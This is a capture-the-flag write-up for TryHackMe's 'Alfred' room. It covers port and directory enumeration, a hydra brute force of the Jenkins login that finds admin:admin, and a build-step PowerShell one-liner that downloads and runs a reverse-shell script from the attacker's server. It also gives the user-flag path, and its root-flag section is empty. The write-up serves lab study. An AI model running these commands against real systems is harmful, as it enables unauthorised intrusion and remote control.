# TryHackMe - Alfred

[Room link](https://tryhackme.com/room/alfred)

---

## Enumeration

Nmap's result :

```bash
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
8080/tcp open  http-proxy
```

Let's moving on the webserver on the port 80. We can see on email -> alfred@wayneenterprises.com

Nothing is really interesting on the source code. 

Let's get a simple dirb for enumerate the website.

```bash
dirb http://<target_ip>
```

We fond anything.

Now, let's see what is on the port 8080. Jenkins form.

There is the same thing for the previous website, let's run a simple dirb scan.

```bash
dirb http://<target_ip>:8080 -w
```

The return concerne only 403 replies.. We need to connect us for move forward.

---

## Exploitation

After few researchs, i find as the default username on Jenkins is : admin.

We can run a bruteforce with this form with hydra.

```bash
sudo hydra -f -V -l admin -P /usr/share/wordlists/SecLists/Passwords/Default-Credentials/default-passwords.txt 10.10.69.128 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit:loginError" -s 8080
```

We found the credentials admin:admin.

We can move on the porject section and "Configure". There is a "build environment" block which allow us to inject remotly code on the target.

As it tells on the TryHackMe topics, lets save a file with a specific Windows reverse shell on a file called "Invoke-PowerShellTcp.ps1".

Once done, let start a local simple python server on the directory where is our reverse shell.

```bash
$ sudo python3 -m http.server 8000
```

Then, add on the "build environment" section this follow lines (don't forget replace variables) :

```txt
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

Now, we need to run the jenkins pipeline.

Now, we are on the target machine.

```cmd
PS C:\Program Files (x86)\Jenkins\workspace\project>
```

---

## User flag

The user flag is here -> C:\users\bruce\Desktop\user.txt

---

## Root flag

